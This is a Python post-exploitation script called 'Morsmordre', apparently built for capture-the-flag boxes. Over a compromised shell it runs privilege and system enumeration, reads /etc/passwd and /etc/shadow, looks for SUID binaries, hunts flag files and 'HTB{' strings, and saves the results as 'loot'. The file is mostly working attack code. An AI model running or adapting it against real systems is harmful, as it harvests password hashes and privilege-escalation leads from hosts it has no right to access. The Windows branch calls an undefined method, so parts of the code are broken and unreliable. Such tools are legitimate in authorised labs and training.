#!/usr/bin/env python3
"""
Morsmordre v1.2 - Red Engine
Auto-Enumeration + Flag Hunter
"""

import os
import sys
import json
import time
import select
import re
from datetime import datetime
from typing import List, Dict

class Morsmordre:
    def __init__(self):
        self.target = os.environ.get('MORSMORDRE_TARGET', 'unknown')
        self.os_type = os.environ.get('MORSMORDRE_OS', 'Linux')
        self.lhost = os.environ.get('MORSMORDRE_LHOST', 'unknown')
        self.loot: List[Dict] = []
        self.flags: List[str] = []
        self.timestamp = datetime.now().isoformat()
        
    def banner(self):
        print("\033[91m┌─────────────────────────────────────┐\033[0m", file=sys.stderr)
        print("\033[91m│ Morsmordre v1.2 - Red Flag Hunter  │\033[0m", file=sys.stderr)
        print("\033[91m│ Target: {:27} │\033[0m".format(self.target), file=sys.stderr)
        print("\033[91m└─────────────────────────────────────┘\033[0m", file=sys.stderr)
        
    def log(self, msg: str, level="info"):
        colors = {"info": "\033[94m", "success": "\033[92m", "warning": "\033[93m", "error": "\033[91m"}
        c = colors.get(level, "")
        print(f"{c}[{level.upper()}] {msg}\033[0m", file=sys.stderr)
        
    def send_recv(self, cmd: str, timeout: float = 3.0) -> str:
        """Send command and get response"""
        # Clear buffer first
        while select.select([sys.stdin], [], [], 0.2)[0]:
            try:
                sys.stdin.read(4096)
            except:
                break
        
        # Send command
        self.log(f"Executing: {cmd}")
        sys.stdout.write(cmd + "\n")
        sys.stdout.flush()
        
        # Read response
        output = []
        start = time.time()
        
        while time.time() - start < timeout:
            if select.select([sys.stdin], [], [], 0.5)[0]:
                try:
                    chunk = sys.stdin.read(4096)
                    if chunk:
                        output.append(chunk)
                        # Extend timeout if we're getting data
                        start = time.time()
                except:
                    break
        
        result = ''.join(output)
        if not result.strip():
            self.log("No output received", "warning")
        return result
    
    def hunt_flags(self):
        """Hunt for CTF flags"""
        self.log("HUNTING FOR FLAGS...", "success")
        
        # Common flag locations
        locations = [
            "/root/root.txt",
            "/home/*/user.txt",
            "/home/*/flag.txt",
            "/flag",
            "/flag.txt",
            "/opt/flag.txt",
            "/var/flag.txt",
            "/tmp/flag.txt",
            "flag.txt",
            "user.txt",
            "root.txt"
        ]
        
        for loc in locations:
            if "*" in loc:
                # Handle wildcards
                out = self.send_recv(f"ls {loc} 2>/dev/null", 1)
                if out.strip():
                    files = out.strip().split('\n')
                    for f in files:
                        if f:
                            content = self.send_recv(f"cat {f} 2>/dev/null", 1)
                            if content and len(content.strip()) > 0:
                                self.flags.append(f"{f}: {content.strip()}")
                                self.log(f"[FLAG] {f}: {content.strip()}", "success")
            else:
                content = self.send_recv(f"cat {loc} 2>/dev/null", 1)
                if content and "No such file" not in content and "Permission denied" not in content:
                    if content.strip():
                        self.flags.append(f"{loc}: {content.strip()}")
                        self.log(f"[FLAG] {loc}: {content.strip()}", "success")
        
        # Search for flag patterns
        self.log("Searching for flag patterns...", "info")
        out = self.send_recv("grep -r 'HTB{' /home /opt /var/www 2>/dev/null | head -5", 2)
        if out:
            for line in out.strip().split('\n'):
                if line:
                    self.flags.append(line)
                    self.log(f"[FLAG PATTERN] {line}", "success")
    
    def add_loot(self, cmd: str, output: str, category: str):
        if output.strip():
            self.loot.append({
                "timestamp": datetime.now().isoformat(),
                "category": category,
                "command": cmd,
                "output": output.strip()
            })
    
    def enum_linux(self):
        self.log("Starting enumeration...")
        
        # Critical commands
        cmds = [
            ("id", "privilege"),
            ("whoami", "privilege"),
            ("hostname", "system"),
            ("uname -a", "system"),
            ("cat /etc/passwd", "credentials"),
            ("cat /etc/shadow 2>/dev/null", "credentials"),
            ("sudo -l 2>/dev/null", "privilege"),
            ("find / -perm -4000 -type f 2>/dev/null | head -20", "privilege"),
            ("ps aux", "processes"),
            ("netstat -tulpn 2>/dev/null || netstat -tuln", "network"),
        ]
        
        for cmd, cat in cmds:
            out = self.send_recv(cmd)
            self.add_loot(cmd, out, cat)
    
    def save(self):
        filename = f"morsmordre_{self.target.replace('.', '_')}_{int(time.time())}.json"
        data = {
            "target": self.target,
            "os": self.os_type,
            "timestamp": self.timestamp,
            "commands_executed": len(self.loot),
            "flags_found": self.flags,
            "loot": self.loot
        }
        
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        
        self.log(f"Saved: {filename}", "success")
        
        if self.flags:
            self.log("="*50, "success")
            self.log("FLAGS FOUND:", "success")
            for f in self.flags:
                self.log(f"  {f}", "success")
            self.log("="*50, "success")
        else:
            self.log("No flags found in common locations", "warning")
    
    def run(self):
        self.banner()
        
        if self.target == "unknown":
            self.log("WARNING: Not spawned by Sectumsempra!", "warning")
            self.log("Run this via: python3 sectumsempra.py", "warning")
            return
        
        # Wait for shell to stabilize
        self.log("Waiting for shell to stabilize...")
        time.sleep(1)
        
        # Test if shell is working
        test = self.send_recv("echo 'MORSMORDRE_TEST'", 2)
        if "MORSMORDRE_TEST" not in test:
            self.log("Shell not responding properly!", "error")
            self.log("Output received: " + repr(test), "error")
        
        if "Windows" in self.os_type:
            self.enum_windows()
        else:
            self.enum_linux()
        
        self.hunt_flags()
        self.save()

if __name__ == "__main__":
    m = Morsmordre()
    m.run()
